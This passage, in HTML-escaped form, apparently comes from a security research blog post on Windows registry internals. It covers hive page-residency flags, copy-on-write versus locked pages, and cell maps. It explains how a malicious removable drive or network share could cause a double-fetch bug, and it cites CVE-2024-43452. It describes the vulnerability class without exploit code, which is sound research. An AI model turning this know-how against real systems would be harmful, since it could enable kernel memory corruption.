 &lt;p class=&quot;tTszyzmaCA-c25&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;Indicates if the kernel maintains a copy of the page through the copy-on-write (CoW) mechanism, as required by the policy that all pages of non-local hives (hives loaded from volumes other than the system volume) must always remain in memory.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c17&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c25&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;The flag is set:&lt;/span&gt;&lt;/p&gt;&lt;ul style=&quot;padding: 0;&quot; class=&quot;lst-kix_404916xkl9yq-0 start&quot;&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c25 c15 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;In HvpViewMapMakeViewRangeValid, as an alternative way of keeping a local copy of the hive pages in memory (if locking fails, or the caller doesn&amp;#39;t want the pages locked).&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c25 c15 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;In HvpViewMapMakeViewRangeCOWByCaller, when converting previously locked pages to the &amp;quot;CoW by policy&amp;quot; state.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c25 c15 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;In HvpMappedViewConvertRegionFromLockedToCOWByPolicy, when lazily converting previously locked pages to the &amp;quot;CoW by policy&amp;quot; state in a thread that runs every 60 seconds (as indicated by CmpLazyLocalizeIntervalInSeconds).&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;
 &lt;p class=&quot;tTszyzmaCA-c17&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c25&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;The flag is cleared:&lt;/span&gt;&lt;/p&gt;&lt;ul style=&quot;padding: 0;&quot; class=&quot;lst-kix_er11mo8sb81m-0 start&quot;&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c25 c15 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;In HvpViewMapMakeViewRangeUnCOWByPolicy, which currently only ever seems to happen for hives loaded from the system volume, i.e. &amp;quot;\SystemRoot&amp;quot; and &amp;quot;\OSDataRoot&amp;quot;, as listed in the global CmpWellKnownVolumeList array.&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=&quot;tTszyzmaCA-c32&quot;&gt;&lt;td class=&quot;tTszyzmaCA-c41&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;tTszyzmaCA-c25&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;VIEW_PAGE_WRITABLE&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;tTszyzmaCA-c42&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;tTszyzmaCA-c25&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;0x8&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;tTszyzmaCA-c49&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;tTszyzmaCA-c25&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;Indicates if the page is currently marked as writable, typically as a result of a modifying operation on the page that hasn&amp;#39;t been yet flushed to disk.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c17&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c25&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;The flag is set:&lt;/span&gt;&lt;/p&gt;&lt;ul style=&quot;padding: 0;&quot; class=&quot;lst-kix_ysdrt8wuz901-0 start&quot;&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c25 c15 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;In HvpViewMapMakeViewRangeCOWByCaller, when marking a cell as dirty.&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;
 &lt;p class=&quot;tTszyzmaCA-c17&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c25&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;The flag is cleared:&lt;/span&gt;&lt;/p&gt;&lt;ul style=&quot;padding: 0;&quot; class=&quot;lst-kix_wgc4so2hx3bb-0 start&quot;&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c25 c15 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;In HvpViewMapMakeViewRangeUnCOWByCaller, when flushing the hive changes to disk.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c25 c15 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;In HvpViewMapSealRange, when setting the memory as read-only for miscellaneous reasons (after performing log file recovery, etc.).&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=&quot;tTszyzmaCA-c32&quot;&gt;&lt;td class=&quot;tTszyzmaCA-c41&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;tTszyzmaCA-c25&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;VIEW_PAGE_LOCKED&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;tTszyzmaCA-c42&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;tTszyzmaCA-c25&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;0x10&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;tTszyzmaCA-c49&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;tTszyzmaCA-c25&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;Indicates if the page is currently locked in physical memory.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c17&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c25&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;The flag is set:&lt;/span&gt;&lt;/p&gt;&lt;ul style=&quot;padding: 0;&quot; class=&quot;lst-kix_9qmrelv5gsqt-0 start&quot;&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c25 c15 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;In HvpViewMapMakeViewRangeValid if the caller requests page locking, and there is enough space left in the 64 MiB working set of the Registry process. In practice, this boils down to locking the initial 2 MiB hive mappings created in HvpViewMapStart for all app hives and for normal hives outside of the system disk volume.&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;
 &lt;p class=&quot;tTszyzmaCA-c17&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c25&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;The flag is cleared:&lt;/span&gt;&lt;/p&gt;&lt;ul style=&quot;padding: 0;&quot; class=&quot;lst-kix_6jkbamo228jj-0 start&quot;&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c25 c15 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;Whenever the state of the page changes to CoW-by-policy or Invalid in the following functions:&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;&lt;ul style=&quot;padding: 0;&quot; class=&quot;lst-kix_6jkbamo228jj-1 start&quot;&gt;&lt;li style=&quot;margin-left: 92pt;&quot; class=&quot;c25 c14 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;HvpViewMapMakeViewRangeCOWByCaller&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 92pt;&quot; class=&quot;c25 c14 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;HvpMappedViewConvertRegionFromLockedToCOWByPolicy&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 92pt;&quot; class=&quot;c25 c14 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;HvpViewMapMakeViewRangeUnCOWByPolicy&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 92pt;&quot; class=&quot;c25 c14 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;HvpViewMapMakeViewRangeInvalid&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;p class=&quot;tTszyzmaCA-c0 tTszyzmaCA-c29&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;The semantics of most of the flags are straightforward, but perhaps VIEW_PAGE_COW_BY_POLICY and VIEW_PAGE_LOCKED warrant a slightly longer explanation. The two flags are mutually exclusive, and they represent nearly identical ways to achieve the same goal: ensure that a copy of each hive page remains resident in memory or a pagefile. Under normal circumstances, the kernel could simply create the necessary section views in their default form, and let the memory management subsystem decide how to handle their pages most efficiently. However, one of the guarantees of the registry is that once a hive has been loaded, it must remain operational for as long as it is active in the system. On the other hand, section views have the property that (parts of) their underlying data may be completely evicted by the kernel, and later re-read from the original storage medium such as the hard drive. So, it is possible to imagine a situation where:&lt;/span&gt;&lt;/p&gt;&lt;ul style=&quot;padding: 0;&quot; class=&quot;lst-kix_b5jwtymjp8wg-0 start&quot;&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c0 c15 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;A hive is loaded from a removable drive (e.g. a CD-ROM or flash drive) or a network share,&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c0 c15 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;Due to high memory pressure from other applications, some of the hive pages are evicted from memory,&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c0 c15 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;The removable drive with the hive file is ejected from the system,&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c0 c15 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;A client subsequently tries to operate on the hive, but parts of it are unavailable and cannot be fetched again from the original source.&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;
 &lt;p class=&quot;tTszyzmaCA-c0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;This could cause some significant problems and make the registry code fail in unexpected ways. It would also constitute a security vulnerability: the kernel assumes that once it has opened and sanitized the hive file, its contents remain consistent for as long as the hive is used. This is achieved by opening the file with exclusive access, but if the hive data was ever re-read by the Windows memory manager, a malicious removable drive or an attacker-controlled network share could ignore the exclusivity request and provide different, invalid data on the second read. This would result in a kind of &amp;quot;double fetch&amp;quot; condition and potentially lead to kernel memory corruption.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c0 tTszyzmaCA-c29&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c0&quot;&gt;&lt;span&gt;To address both the reliability and security concerns, Windows makes sure to never evict pages corresponding to hives for which exclusive access cannot be guaranteed. This covers hives loaded from a location other than the system volume, and since Windows 10 19H1, also all app hives regardless of the file location. The first way to achieve this is by locking the pages directly in physical memory with a ZwLockVirtualMemory call. It is used for the initial &amp;le; 2 MiB section views created while loading a hive, up to the working set limit of the Registry process currently set at 64 MiB. The second way is by taking advantage of the copy-on-write mechanism &amp;ndash; that is, marking the relevant pages as &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c22&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/memory/memory-protection-constants#PAGE_WRITECOPY&quot;&gt;PAGE_WRITECOPY&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&amp;nbsp;and subsequently touching each of them using the HvpViewMapTouchPages helper function. This causes the memory manager to create a private copy of each memory page containing the same data as the original, thus preventing them from ever being unavailable for registry operations.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c0 tTszyzmaCA-c29&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c0&quot;&gt;&lt;span&gt;Between the two types of resident pages, the CoW type effectively becomes the default option in the long term. Eventually most pages converge to this state, even if they initially start as &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;locked. This is because locked pages transition to CoW on multiple occasions, e.g. when converted by the background CmpDoLocalizeNextHive thread that runs every 60 seconds, or during the modification of a cell. On the other hand, once a page transitions to the CoW state, it never reverts to being locked. A diagram illustrating the transitions between the page residence states in a hive loaded from removable/remote storage is shown below:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c0 tTszyzmaCA-c29&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&lt;a href=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjt-euMQDpGa7-3Cxdej273QDvPm98mUGVm0M_dQvgf-O_DCbJ0Fb9GLKm2X6F4TOnGo6V11CGYtqHhr9221IMWKO4ypXctxoEn0Hzj2OtCo5Vhkbnxr2p9Q-3ebwaOBJcMvZTi8cx8U1p8dr73KLdj6wsxW7FLnpKB-bzSEfPD88mSjifWeEYa6AIKDT4/s1200/image13.png&quot; style=&quot;display: block; padding: 1em 0;text-align: center;&quot;&gt;&lt;img src=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjt-euMQDpGa7-3Cxdej273QDvPm98mUGVm0M_dQvgf-O_DCbJ0Fb9GLKm2X6F4TOnGo6V11CGYtqHhr9221IMWKO4ypXctxoEn0Hzj2OtCo5Vhkbnxr2p9Q-3ebwaOBJcMvZTi8cx8U1p8dr73KLdj6wsxW7FLnpKB-bzSEfPD88mSjifWeEYa6AIKDT4/s1200/image13.png&quot; border=&quot;0&quot; alt=&quot;State transition diagram illustrating data states like VALID, LOCKED, and COW (Copy-on-Write), and transitions such as load, dirty, and flush, in the context of Windows Registry data management.&quot; style=&quot;max-height: 750px; max-width: 600px;&quot;title=&quot;State transition diagram illustrating data states like VALID, LOCKED, and COW (Copy-on-Write), and transitions such as load, dirty, and flush, in the context of Windows Registry data management.&quot; /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c39 tTszyzmaCA-c13 tTszyzmaCA-c29&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;For normal hives loaded from the system volume (i.e. without the VIEW_MAP_MUST_BE_KEPT_LOCAL flag set), the state machine is much simpler:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&lt;a href=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiL-WU3mvLfndmQaY0Ta8y1LCQmWyQdmbpC5yJNNLslyfFMb0LApWGfh8HAsiOh0XcCGz0tjTcZzcY-dkg-GktMsS2sCJfdB11Rq1sBZd3iH7NivRdo2E_oe-AZjaFZProHRsEEniBton6HQR6hs5NOpS8x6Hb3zV8IT-tpiFC5Z3aZxUId5LnbR-UMkOU/s1200/image9.png&quot; style=&quot;display: block; padding: 1em 0;text-align: center;&quot;&gt;&lt;img src=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiL-WU3mvLfndmQaY0Ta8y1LCQmWyQdmbpC5yJNNLslyfFMb0LApWGfh8HAsiOh0XcCGz0tjTcZzcY-dkg-GktMsS2sCJfdB11Rq1sBZd3iH7NivRdo2E_oe-AZjaFZProHRsEEniBton6HQR6hs5NOpS8x6Hb3zV8IT-tpiFC5Z3aZxUId5LnbR-UMkOU/s1200/image9.png&quot; border=&quot;0&quot; alt=&quot;Simplified state machine diagram for normal Windows Registry hive loading (without VIEW_MAP_MUST_BE_KEPT_LOCAL flag). It shows a &amp;#39;load&amp;#39; action leading to a &amp;#39;VALID&amp;#39; state. A &amp;#39;dirty&amp;#39; action transitions to a combined &amp;#39;VALID/WRITABLE/COW_BY_CALLER&amp;#39; state, and a &amp;#39;flush&amp;#39; action returns to the &amp;#39;VALID&amp;#39; state.&quot; style=&quot;max-height: 750px; max-width: 600px;&quot;title=&quot;Simplified state machine diagram for normal Windows Registry hive loading (without VIEW_MAP_MUST_BE_KEPT_LOCAL flag). It shows a &amp;#39;load&amp;#39; action leading to a &amp;#39;VALID&amp;#39; state. A &amp;#39;dirty&amp;#39; action transitions to a combined &amp;#39;VALID/WRITABLE/COW_BY_CALLER&amp;#39; state, and a &amp;#39;flush&amp;#39; action returns to the &amp;#39;VALID&amp;#39; state.&quot; /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c39 tTszyzmaCA-c13 tTszyzmaCA-c29&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c0&quot;&gt;&lt;span&gt;As a side note, &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c22&quot;&gt;&lt;a href=&quot;https://project-zero.issues.chromium.org/issues/42451731&quot;&gt;CVE-2024-43452&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;was an interesting bug that exploited a flaw in the page residency protection logic.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;The bug arose because some data wasn&amp;#39;t guaranteed to be resident in memory and could be fetched twice from a remote SMB share during bin mapping.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;This occurred early in the hive loading process, before page residency protections were fully in place.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;The kernel trusted the data from the second read without re-validation, allowing it to be maliciously set to invalid values, resulting in kernel memory corruption.&lt;/span&gt;&lt;/p&gt;&lt;h4 class=&quot;tTszyzmaCA-c21 tTszyzmaCA-c13&quot; id=&quot;h.qfzbx8rneljk&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c35 tTszyzmaCA-c4&quot;&gt;Cell maps&lt;/span&gt;&lt;/h4&gt;
 &lt;p class=&quot;tTszyzmaCA-c0&quot;&gt;&lt;span&gt;As discussed in &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c22&quot;&gt;&lt;a href=&quot;https://googleprojectzero.blogspot.com/2024/12/the-windows-registry-adventure-5-regf.html&quot;&gt;Part 5&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, almost every cell contains references to other cells in the hive in the form of &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;cell indexes. Consequently, virtually every registry operation involves multiple rounds of translating cell indexes into their corresponding virtual addresses in order to traverse the registry structure. Section views are stored in a red-black tree, so the search complexity is O(log&amp;nbsp;n). This may seem decent, but if we consider that on a typical system, the registry is read much more often than it is extended/shrunk, it becomes apparent that it makes sense to further optimize the search operation at the cost of a less efficient insertion/deletion. And this is exactly what cell maps are: a way of trading a faster search complexity of O(1) for slower insertion/deletion complexity of O(n) instead of O(log&amp;nbsp;n). Thanks to this technique, HvpGetCellPaged &amp;ndash; perhaps the hottest function in the Windows registry implementation &amp;ndash; executes in constant time.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c0 tTszyzmaCA-c29&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c0&quot;&gt;&lt;span&gt;In technical terms, cell maps are pagetable-like structures that divide the 32-bit hive address space into smaller, nested layers consisting of so-called directories, tables, and entries. As a reminder, the layout of cell indexes and cell maps is illustrated in the diagram below, based on a similar diagram in the Windows Internals book, which itself draws from Mark Russinovich&amp;#39;s 1999 article, &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c22&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/previous-versions//cc750583(v%3Dtechnet.10)&quot;&gt;Inside the Registry&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c39 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&lt;a href=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjt4QKKXqrippLUjWNAvXiEPc5Fo6G-_H0CPRusrJQ0vb3Tf2iWyj6wKd7LaWRuzgIwRaq0iyWXhWJPlYIfB120h3gokRyc-MHCEPV8xza2dY7jLqL0dglEy6M5lT9YDlSUcbpF7F8YjgiCEjQEQR8SB7a2KvAECsTyQpgsHCB1eyt3zV7IX42kxY4_ijI/s1200/image10.png&quot; style=&quot;display: block; padding: 1em 0;text-align: center;&quot;&gt;&lt;img src=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjt4QKKXqrippLUjWNAvXiEPc5Fo6G-_H0CPRusrJQ0vb3Tf2iWyj6wKd7LaWRuzgIwRaq0iyWXhWJPlYIfB120h3gokRyc-MHCEPV8xza2dY7jLqL0dglEy6M5lT9YDlSUcbpF7F8YjgiCEjQEQR8SB7a2KvAECsTyQpgsHCB1eyt3zV7IX42kxY4_ijI/s1200/image10.png&quot; border=&quot;0&quot; alt=&quot;Diagram illustrating the Windows Registry cell index structure and lookup mechanism, showing how the index&amp;#39;s fields (Storage selector, Directory index, Table index, Byte offset) navigate through Storage list, Directory, and Table structures to locate a target Cell block.&quot; style=&quot;max-height: 750px; max-width: 600px;&quot;title=&quot;Diagram illustrating the Windows Registry cell index structure and lookup mechanism, showing how the index&amp;#39;s fields (Storage selector, Directory index, Table index, Byte offset) navigate through Storage list, Directory, and Table structures to locate a target Cell block.&quot; /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c0&quot;&gt;&lt;span&gt;Given the nature of the data structure, the corresponding &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c44&quot;&gt;cell map walk&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&amp;nbsp;involves dereferencing three nested arrays based on the subsequent 1, 10 and 9-bit parts of the cell index, and then adding the final 12-bit offset to the page-aligned address of the target block. The internal kernel structures matching the respective layers of the cell map are _DUAL, _HMAP_DIRECTORY, _HMAP_TABLE and _HMAP_ENTRY, all publicly accessible via the ntoskrnl.exe PDB symbols. The entry point to the cell map is the Storage array at the end of the _HHIVE structure:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c8&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;0:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;kd&amp;gt;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;dt&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;_HHIVE&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;nt!_HHIVE&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;[...]&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;+0x118&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Storage&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;[2]&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;_DUAL&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c23&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;br/&gt;
 &lt;p class=&quot;tTszyzmaCA-c0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;The index into the two-element array represents the storage type, 0 for stable and 1 for volatile, so a single _DUAL structure describes a 2 GiB view of a specific storage space:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c8&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&lt;/span&gt;&lt;/p&gt;
